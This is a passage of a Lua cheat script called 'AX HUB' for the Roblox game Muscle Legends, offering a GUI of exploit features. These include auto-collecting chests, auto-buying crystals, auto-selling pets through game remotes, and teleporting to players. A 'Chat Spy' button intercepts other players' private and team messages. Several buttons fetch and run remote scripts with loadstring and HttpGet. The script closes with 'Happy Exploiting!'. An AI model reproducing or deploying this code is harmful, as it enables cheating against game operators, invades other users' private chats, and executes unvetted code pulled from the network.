                            a.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                            a.ResetOnSpawn = false
                            b.Parent = a
                            b.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                            b.BackgroundTransparency = 1.000
                            b.Position = UDim2.new(0.7, 0, 0.75, 0)
                            b.Size = UDim2.new(0.0636147112, 0, 0.0661305636, 0)
                            b.SizeConstraint = Enum.SizeConstraint.RelativeXX
                            b.Image = h.Off
                            c.Name = "Shiftlock Cursor"
                            c.Parent = a
                            c.Image = h.Lock
                            c.Size = UDim2.new(0.03, 0, 0.03, 0)
                            c.Position = UDim2.new(0.5, 0, 0.5, 0)
                            c.AnchorPoint = Vector2.new(0.5, 0.5)
                            c.SizeConstraint = Enum.SizeConstraint.RelativeXX
                            c.BackgroundTransparency = 1
                            c.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
                            c.Visible = false
                            b.MouseButton1Click:Connect(
                                function()
                                    if not l then
                                        l =
                                            f.RenderStepped:Connect(
                                            function()
                                                e.Character.Humanoid.AutoRotate = false
                                                b.Image = h.On
                                                c.Visible = true
                                                e.Character.HumanoidRootPart.CFrame =
                                                    CFrame.new(
                                                    e.Character.HumanoidRootPart.Position,
                                                    Vector3.new(
                                                        workspace.CurrentCamera.CFrame.LookVector.X * i,
                                                        e.Character.HumanoidRootPart.Position.Y,
                                                        workspace.CurrentCamera.CFrame.LookVector.Z * i
                                                    )
                                                )
                                                workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * j
                                                workspace.CurrentCamera.Focus =
                                                    CFrame.fromMatrix(
                                                    workspace.CurrentCamera.Focus.Position,
                                                    workspace.CurrentCamera.CFrame.RightVector,
                                                    workspace.CurrentCamera.CFrame.UpVector
                                                ) * j
                                            end
                                        )
                                    else
                                        e.Character.Humanoid.AutoRotate = true
                                        b.Image = h.Off
                                        workspace.CurrentCamera.CFrame = workspace.CurrentCamera.CFrame * k
                                        c.Visible = false
                                        pcall(
                                            function()
                                                l:Disconnect()
                                                l = nil
                                            end
                                        )
                                    end
                                end
                            )
                            local a = g:BindAction("Shift Lock", ShiftLock, false, "On")
                            g:SetPosition("Shift Lock", UDim2.new(0.8, 0, 0.8, 0))
                            return {} and a
                        end
                    end
                )
                a.newToggle(
                    "Lock Client Position",
                    "This will keep you in the same place as long as it's on.",
                    false,
                    function(a)
                        if a then
                            x = true
                            local a = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                            while x do
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = a
                                wait()
                            end
                        else
                            x = false
                        end
                    end
                )
                a.newButton(
                    "Infinite Yield Admin",
                    "Popular admin to execute commands.",
                    function()
                        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))(

                        )
                    end
                )
                a.newButton(
                    "Ghost Hub",
                    "Popular Gui that has some useful tools.",
                    function()
                        if not C then
                            C = true
                            loadstring(
                                game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub")
                            )()
                        end
                    end
                )
                a.newButton(
                    "Chat Spy",
                    "Spy on people's private messages. (Sus?)",
                    function()
                        if not y then
                            y = true
                            Config = {enabled = true, spyOnMyself = false, public = false, publicItalics = true}
                            PrivateProperties = {
                                Color = Color3.fromRGB(0, 255, 255),
                                Font = Enum.Font.SourceSansBold,
                                TextSize = 18
                            }
                            local a = game:GetService("StarterGui")
                            local b = game:GetService("Players")
                            local c = b.LocalPlayer
                            local d =
                                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
                                "SayMessageRequest"
                            )
                            local e =
                                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild(
                                "OnMessageDoneFiltering"
                            )
                            local f = (_G.chatSpyInstance or 0) + 1
                            _G.chatSpyInstance = f
                            local function g(g, h)
                                if _G.chatSpyInstance == f then
                                    if g == c and h:lower():sub(1, 4) == "/spy" then
                                        Config.enabled = not Config.enabled
                                        wait(0.3)
                                        PrivateProperties.Text =
                                            "{SPY " .. (Config.enabled and "EN" or "DIS") .. "ABLED}"
                                        a:SetCore("ChatMakeSystemMessage", PrivateProperties)
                                    elseif Config.enabled and (Config.spyOnMyself == true or g ~= c) then
                                        h = h:gsub("[\n\r]", ""):gsub("\t", " "):gsub("[ ]+", " ")
                                        local f = true
                                        local b =
                                            e.OnClientEvent:Connect(
                                            function(a, d)
                                                if
                                                    a.SpeakerUserId == g.UserId and
                                                        a.Message == h:sub(#h - #a.Message + 1) and
                                                        (d == "All" or
                                                            (d == "Team" and Config.public == false and
                                                                b[a.FromSpeaker].Team == c.Team))
                                                 then
                                                    f = false
                                                end
                                            end
                                        )
                                        wait(1)
                                        b:Disconnect()
                                        if f and Config.enabled then
                                            if Config.public then
                                                d:FireServer(
                                                    (Config.publicItalics and "/me " or "") ..
                                                        "{SPY} [" .. g.Name .. "]: " .. h,
                                                    "All"
                                                )
                                            else
                                                PrivateProperties.Text = "{SPY} [" .. g.Name .. "]: " .. h
                                                a:SetCore("ChatMakeSystemMessage", PrivateProperties)
                                            end
                                        end
                                    end
                                end
                            end
                            for a, a in ipairs(b:GetPlayers()) do
                                a.Chatted:Connect(
                                    function(b)
                                        g(a, b)
                                    end
                                )
                            end
                            b.PlayerAdded:Connect(
                                function(a)
                                    a.Chatted:Connect(
                                        function(b)
                                            g(a, b)
                                        end
                                    )
                                end
                            )
                            PrivateProperties.Text = "{SPY " .. (Config.enabled and "EN" or "DIS") .. "ABLED}"
                            a:SetCore("ChatMakeSystemMessage", PrivateProperties)
                            local a = c.PlayerGui.Chat.Frame
                            a.ChatChannelParentFrame.Visible = true
                            a.ChatBarParentFrame.Position =
                                a.ChatChannelParentFrame.Position +
                                UDim2.new(UDim.new(), a.ChatChannelParentFrame.Size.Y)
                        end
                    end
                )
                a.newButton(
                    "Collect All Chests",
                    "Auto collect chests.",
                    function()
                        local a = {
                            Workspace.mythicalChest.circleInner,
                            Workspace.goldenChest.circleInner,
                            Workspace.magmaChest.circleInner,
                            Workspace.legendsChest.circleInner,
                            Workspace.groupRewardsCircle.circleInner,
                            Workspace.enchantedChest.circleInner
                        }
                        local b = game.Players.LocalPlayer
                        local b = b.Character or b.CharacterAdded:Wait()
                        local b = b:WaitForChild("HumanoidRootPart")
                        local function c()
                            for a, a in ipairs(a) do
                                firetouchinterest(b, a, 0)
                                firetouchinterest(b, a, 1)
                                wait()
                            end
                            wait()
                        end
                        c()
                    end
                )
                a.newButton(
                    "Redeem All Codes",
                    "Auto redeem all possible in-game codes. (For Starters)",
                    function()
                        local a = {
                            "spacegems50",
                            "launch250",
                            "galaxycrystal50",
                            "epicreward500",
                            "frostgems10",
                            "Supermuscle100",
                            "Skyagility50",
                            "Millionwarriors",
                            "Musclestorm50",
                            "Superpunch100",
                            "ultimate250",
                            "Megalift50",
                            "Speedy50"
                        }
                        local function b()
                            for a, a in ipairs(a) do
                                local a, b =
                                    pcall(
                                    function()
                                        game.ReplicatedStorage.rEvents.codeRemote:InvokeServer(a)
                                    end
                                )
                                if a then
                                else
                                end
                                wait()
                            end
                        end
                        b()
                    end
                )
                a.newLabel("Shaders Section")
                a.newButton(
                    "Morning",
                    "Set time to 7:00 AM",
                    function()
                        game.Lighting:SetMinutesAfterMidnight(420)
                    end
                )
                a.newButton(
                    "Day (Default)",
                    "Set time to 12:00 PM",
                    function()
                        game.Lighting:SetMinutesAfterMidnight(720)
                    end
                )
                a.newButton(
                    "Sunset",
                    "Set time to 6:00 PM",
                    function()
                        game.Lighting:SetMinutesAfterMidnight(1055)
                    end
                )
                a.newButton(
                    "Midnight",
                    "Set time to 12:00 AM",
                    function()
                        game.Lighting:SetMinutesAfterMidnight(0)
                    end
                )
                a.newLabel("Other Players Section")
                a.newInput(
                    "View Player",
                    "Enter player username (Caps don't matter)",
                    function(a)
                        local b = game:GetService("Players")
                        local c = game:GetService("Workspace")
                        local c = c.CurrentCamera
                        local d = false
                        local e = string.lower(a)
                        local function f(a)
                            if d then
                                return
                            end
                            d = true
                            for a, a in pairs(b:GetPlayers()) do
                                if string.lower(a.Name) == e then
                                    c.CameraSubject = a.Character or a.CharacterAdded:Wait()
                                    local function b(a)
                                        c.CameraSubject = a
                                    end
                                    if G then
                                        G:Disconnect()
                                        G = nil
                                    end
                                    G = a.CharacterAdded:Connect(b)
                                    wait(0.5)
                                    d = false
                                    break
                                end
                            end
                            if d then
                            end
                        end
                        f(a)
                        G = G
                    end
                )
                a.newButton(
                    "Unview Player",
                    "No more viewing if you're viewing a player",
                    function()
                        local a = game:GetService("Players")
                        local b = game:GetService("Workspace")
                        local c = game:GetService("UserInputService")
                        local d = game:GetService("RunService")
                        local e = b.CurrentCamera
                        local f = false
                        local g
                        local h
                        local i
                        local j
                        local k
                        local function l()
                            e.FieldOfView = 70
                            e.CameraType = g
                            g = nil
                            e.CFrame = h
                            h = nil
                            e.Focus = i
                            i = nil
                            c.MouseIconEnabled = j
                            j = nil
                            c.MouseBehavior = k
                            k = nil
                        end
                        local function c()
                            if not f then
                                return
                            end
                            Input.StopCapture()
                            d:UnbindFromRenderStep("Freecam")
                            l()
                            b.Camera.FieldOfView = 70
                            f = false
                        end
                        local function b()
                            local a = a.LocalPlayer
                            if a.Character then
                                local a = a.Character
                                if e.CameraSubject ~= a then
                                    e.CameraSubject = a
                                end
                            end
                            c()
                            if G then
                                G:Disconnect()
                                G = nil
                            end
                        end
                        b()
                    end
                )
                a.newInput(
                    "Teleport to Player",
                    "Enter player username (Caps don't matter)",
                    function(a)
                        local a = string.lower(a)
                        for b, b in pairs(game.Players:GetPlayers()) do
                            if string.lower(b.Name) == a then
                                if b.Character and b.Character:FindFirstChild("HumanoidRootPart") then
                                    local a = game.Players.LocalPlayer
                                    local b = b.Character.HumanoidRootPart.Position
                                    a.Character.HumanoidRootPart.CFrame = CFrame.new(b + Vector3.new(3, 0, 0))
                                end
                                break
                            end
                        end
                    end
                )
                a.newLabel("Crystals & Pets")
                a.newDropdown(
                    "Select Crystal",
                    "Choose crystal from dropdown.",
                    {
                        "Blue Crystal (1K)",
                        "Green Crystal (3K)",
                        "Frost Crystal (5K)",
                        "Mythical Crystal (8K)",
                        "Inferno Crystal (15K)",
                        "Legends Crystal (30K)",
                        "Dark Nebula Crystal (500K)",
                        "Muscle Elite Crystal (1M)",
                        "Galaxy Oracle Crystal (1.5M)",
                        "Battle Legends Crystal (1.5M)",
                        "Jungle Crystal (3M)",
                        "Sky Eclipse Crystal (10M)"
                    },
                    function(a)
                        L = string.sub(a, 1, string.find(a, " %(") - 1)
                    end
                )
                a.newToggle(
                    "Auto Buy Selected Crystal",
                    "Only works if you have enough gems, if you do have the gems it will use them.",
                    false,
                    function(a)
                        if a then
                            J = true
                            while J do
                                game.ReplicatedStorage.rEvents.openCrystalRemote:InvokeServer("openCrystal", L)
                                wait()
                            end
                        else
                            J = false
                        end
                    end
                )
                a.newInput(
                    "Select Pet",
                    "Enter the pet name to select! (Caps don't matter)",
                    function(a)
                        for b, b in pairs(game.ReplicatedStorage.cPetShopFolder:GetChildren()) do
                            if string.lower(b.Name) == string.lower(a) then
                                M = b
                            end
                        end
                    end
                )
                a.newToggle(
                    "Confirm Sell",
                    "You can only sell the pets if this is turned on! This starts the Auto Selling.",
                    false,
                    function(a)
                        if a then
                            N = true
                        else
                            N = false
                        end
                    end
                )
                a.newToggle(
                    "Auto Sell Selected Pet",
                    "THIS IS DANGEROUS AND WILL SELL ALL THE PETS WITH THE SELECTED NAME! Confirm above.",
                    false,
                    function(a)
                        if a then
                            K = true
                            while K do
                                if N and M then
                                    for a, a in pairs(game.Players.LocalPlayer.petsFolder:GetDescendants()) do
                                        if a.Name == M.Name then
                                            local a, b =
                                                pcall(
                                                function()
                                                    game.ReplicatedStorage.rEvents.sellPetEvent:FireServer(
                                                        "sellPet",
                                                        game.Players.LocalPlayer.petsFolder:FindFirstChild(
                                                            a.Parent.Name
                                                        ):FindFirstChild(a.Name)
                                                    )
                                                end
                                            )
                                            if not a then
                                            end
                                            wait()
                                        end
                                    end
                                end
                                wait()
                            end
                        else
                            K = false
                        end
                    end
                )
                a.newLabel("🎮THIS IS AX HUB 1.09.1")
                a.newLabel(
                    "📖There's a 'status' button at the top right corner of your screen, shows every player's full status real-time!"
                )
                a.newLabel("📖All map barriers are removed. (Annoying invisible walls)")
                a.newLabel("📖All statues in every map have been removed. (annoying)")
                a.newLabel("🔥Happy Exploiting!🔥")
            else
            end
        else
            i.Text = "Invalid Key!"
            i.TextColor3 = Color3.fromRGB(255, 0, 0)
            wait(0.7)
            i.Text = ""
            i.PlaceholderText = "Enter Key"
            i.TextColor3 = Color3.fromRGB(255, 255, 255)
        end
    end
    g.MouseButton1Click:Connect(f)
    h.MouseButton1Click:Connect(j)
else
    b("Invalid Game!", "AX HUB only works on '💪Muscle Legends'.", 15)
end
